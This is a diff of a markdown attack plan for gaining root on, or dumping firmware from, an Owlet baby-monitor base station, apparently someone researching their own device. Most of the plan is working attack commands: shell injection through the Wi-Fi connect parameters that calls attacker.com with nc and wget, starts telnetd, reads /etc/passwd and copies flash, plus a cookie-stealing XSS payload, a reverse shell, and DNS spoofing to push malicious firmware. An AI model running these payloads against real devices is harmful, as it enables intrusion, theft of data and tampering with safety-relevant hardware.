@@ -3,6 +3,7 @@
 **Objective:** Obtain root access or dump firmware without physical disassembly
 
 **Device Info:**
+
 - Base Station DSN: AC000W025363194
 - Firmware: B1.0.3-c9c4_S1.0.4-64c1_BB0.7.34_SB0.7.33_SD6.1.1
 - IP: 192.168.0.1 (when in AP mode)
@@ -17,6 +18,7 @@ Owlet Cam (CVE-2023-6321) had command injection → root shell. Test similar vec
 ### Test Cases
 
 **1.1 SSID Parameter Injection**
+
 ```bash
 # Test shell metacharacters in SSID
 curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test;reboot&key=password'
@@ -28,23 +30,27 @@ curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=`nc${IFS}attacker.com${I
 ```
 
 **1.2 Password/Key Parameter Injection**
+
 ```bash
 curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=TestNetwork&key=pass;telnetd${IFS}-l${IFS}/bin/sh'
 curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=TestNetwork&key=pass`wget${IFS}http://attacker.com/fw_dump.sh`'
 ```
 
 **1.3 BSSID Parameter Injection**
+
 ```bash
 curl -X POST 'http://192.168.0.1/wifi_connect.json?bssid=aa:bb:cc:dd:ee:ff;cat${IFS}/etc/passwd'
 ```
 
 **1.4 Profile Deletion Injection**
+
 ```bash
 curl -X DELETE 'http://192.168.0.1/wifi_profile.json?ssid=test;dd${IFS}if=/dev/mtdblock0${IFS}of=/tmp/fw.bin'
 curl -X DELETE 'http://192.168.0.1/wifi_profile.json?ssid=test|busybox${IFS}httpd${IFS}-p${IFS}8080${IFS}-h${IFS}/'
 ```
 
 ### Detection Strategies
+
 - Monitor device behavior (reboots, network activity)
 - Check response timing (delays indicate command execution)
 - Setup listener for reverse shells: `nc -lvnp 4444`
@@ -56,9 +62,13 @@ curl -X DELETE 'http://192.168.0.1/wifi_profile.json?ssid=test|busybox${IFS}http
 
 ### Common IoT/Ayla Endpoints to Probe
 
+[google](google.com)
+
 ```bash
 # System/Debug endpoints
 curl -v http://192.168.0.1/status.json
+
+
 curl -v http://192.168.0.1/system.json
 curl -v http://192.168.0.1/version.json
 curl -v http://192.168.0.1/config.json
@@ -78,6 +88,7 @@ curl -v http://192.168.0.1/ayla/config.json
 curl -v http://192.168.0.1/cloud_config.json
 curl -v http://192.168.0.1/device.json
 curl -v http://192.168.0.1/properties.json
+  returns 403
 
 # Admin/Test endpoints
 curl -v http://192.168.0.1/admin.json
@@ -86,14 +97,21 @@ curl -v http://192.168.0.1/diag.json
 curl -v http://192.168.0.1/diagnostics.json
 ```
 
+only [status request](/home/ssg/repos/sock_hack/recon/api/status.json) was
+successful.
+
+properties returns 403
+
 ### Directory/File Fuzzing
+
 ```bash
 # Common embedded web paths
 for path in admin debug test config system firmware update ota logs diagnostics factory; do
   echo "Testing /$path"
-  curl -s -o /dev/null -w "%{http_code}" http://192.168.0.1/$path
-  curl -s -o /dev/null -w "%{http_code}" http://192.168.0.1/$path.html
-  curl -s -o /dev/null -w "%{http_code}" http://192.168.0.1/$path.json
+  curl -s -o /dev/null -w "%{http_code}\n" http://192.168.0.1/$path
+  curl -s -o /dev/null -w "%{http_code}\n" http://192.168.0.1/$path.html
+  curl -s -o /dev/null -w "%{http_code}\n" http://192.168.0.1/$path.json
+  echo "--------------------------------------------------------------------------------"
 done
 ```
 
@@ -123,10 +141,12 @@ curl -v https://aos-dev.aylanetworks.com/otaservice/v1/host_images
 ### 3B: MITM Firmware Update
 
 **Prerequisites:**
+
 - Device must be connected to your network (not just AP mode)
 - Ability to intercept DNS/HTTP traffic
 
 **Steps:**
+
 1. Configure device to connect to your WiFi (via web UI)
 2. Monitor traffic for firmware update checks
 3. DNS spoof Ayla Networks domains:
@@ -137,6 +157,7 @@ curl -v https://aos-dev.aylanetworks.com/otaservice/v1/host_images
    - Serve malicious firmware with debug enabled/root shell
 
 **Tools:**
+
 ```bash
 # DNS spoofing
 echo "192.168.0.100 SS3-Sleep-1a2039d9-device.aylanetworks.com" >> /etc/hosts
@@ -151,6 +172,7 @@ mitmproxy --mode transparent
 ### 3C: Trigger OTA Update
 
 **Check for update trigger mechanisms:**
+
 ```bash
 # POST requests that might trigger update
 curl -X POST http://192.168.0.1/update.json
@@ -185,6 +207,7 @@ curl 'http://192.168.0.1/../../proc/self/maps'
 ```
 
 ### Look for Debug Info in Responses
+
 - Stack traces revealing binary paths
 - Library versions (can identify kernel/libc)
 - Filesystem structure
@@ -218,6 +241,7 @@ curl -v http://192.168.0.1/wifi_status.json -H "Authorization: Bearer test"
 4. Use admin session to access firmware download features
 
 **Test XSS in SSID field:**
+
 ```bash
 curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=<script>alert(1)</script>&key=test'
 curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=<img src=x onerror=fetch("http://attacker.com/"+document.cookie)>&key=test'
@@ -228,6 +252,7 @@ curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=<img src=x onerror=fetch
 ## Phase 7: Firmware Extraction via Cloud API (Research)
 
 **Investigation tasks:**
+
 1. Research Ayla Networks API documentation thoroughly
 2. Look for publicly disclosed Ayla vulnerabilities
 3. Check if firmware URLs are predictable/guessable
@@ -235,6 +260,7 @@ curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=<img src=x onerror=fetch
 5. Try to register as a developer to access OTA management console
 
 **Potential firmware URL patterns:**
+
 ```
 https://ayla-firmware.s3.amazonaws.com/owlet/...
 https://cdn.aylanetworks.com/firmware/owlet/...
@@ -246,6 +272,7 @@ https://*.aylanetworks.com/ota/SS3/B1.0.3/...
 ## Phase 8: Social Engineering / Public Firmware Sources
 
 **Check if firmware is publicly available:**
+
 1. Search FCC database for firmware files (FCC ID: 2AIEP-0BL3A)
 2. Check Owlet support site for firmware downloads
 3. Search for "owlet dreamsock firmware download"
@@ -259,6 +286,7 @@ https://*.aylanetworks.com/ota/SS3/B1.0.3/...
 **If all remote methods fail, minimal-invasive physical access:**
 
 ### UART Access (Non-destructive)
+
 1. Look for UART test points on PCB (don't need to fully disassemble)
 2. Common UART pinouts: GND, TX, RX, VCC (3.3V or 5V)
 3. Use USB-to-UART adapter (CP2102, FTDI)
@@ -266,11 +294,13 @@ https://*.aylanetworks.com/ota/SS3/B1.0.3/...
 5. May get bootloader console or root shell
 
 **Detection without opening:**
+
 - Some devices have UART exposed via "debug" connectors
 - USB port might expose UART (check USB-devices output)
 - External programming headers
 
-### Tools Needed (if going physical):
+### Tools Needed (if going physical)
+
 - Multimeter (identify UART pinout)
 - USB-to-UART adapter ($5-10)
 - Logic analyzer (optional, helps find baudrate)
@@ -281,12 +311,14 @@ https://*.aylanetworks.com/ota/SS3/B1.0.3/...
 ## Success Indicators
 
 **Root Access Achieved If:**
+
 - Shell prompt appears (via injection/UART)
 - Can execute arbitrary commands
 - Can read `/etc/passwd`, `/proc/cmdline`
 - Can access `/dev/mtdX` (flash partitions)
 
 **Firmware Dump Successful If:**
+
 - Downloaded complete firmware image
 - Binary file containing bootloader + kernel + filesystem
 - Can extract with `binwalk -e firmware.bin`
@@ -321,7 +353,7 @@ curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test`/bin/sh -i >& /dev/
 ## References
 
 - CVE-2023-6321: Owlet Cam command injection
-- Ayla Networks API Docs: https://docs.aylanetworks.com/
-- Ayla OTA Docs: https://docs.aylanetworks.com/docs/perform-ota-update
+- Ayla Networks API Docs: <https://docs.aylanetworks.com/>
+- Ayla OTA Docs: <https://docs.aylanetworks.com/docs/perform-ota-update>
 - Device DSN: AC000W025363194
 - Firmware Version: B1.0.3-c9c4_S1.0.4-64c1_BB0.7.34_SB0.7.33_SD6.1.1
